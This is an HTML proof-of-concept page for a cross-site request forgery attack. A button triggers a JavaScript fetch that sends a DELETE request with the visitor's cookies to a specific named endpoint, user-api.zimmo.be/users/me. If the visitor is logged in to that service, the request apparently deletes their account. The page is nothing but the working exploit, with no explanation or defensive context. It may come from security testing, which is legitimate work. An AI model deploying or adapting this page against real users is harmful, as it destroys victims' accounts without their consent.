<!DOCTYPE html>
<html>
  <body>
    <h1>CSRF PoC - JavaScript DELETE Attempt</h1>
    <button onclick="sendCSRF()">Click to trigger DELETE</button>

    <script>
      function sendCSRF() {
        fetch("https://user-api.zimmo.be/users/me", {
          method: "DELETE",
          credentials: "include", // Send cookies
        })
        .then(response => response.text())
        .then(data => {
          console.log("Response:", data);
        })
        .catch(error => {
          console.error("Error:", error);
        });
      }
    </script>
  </body>
</html>
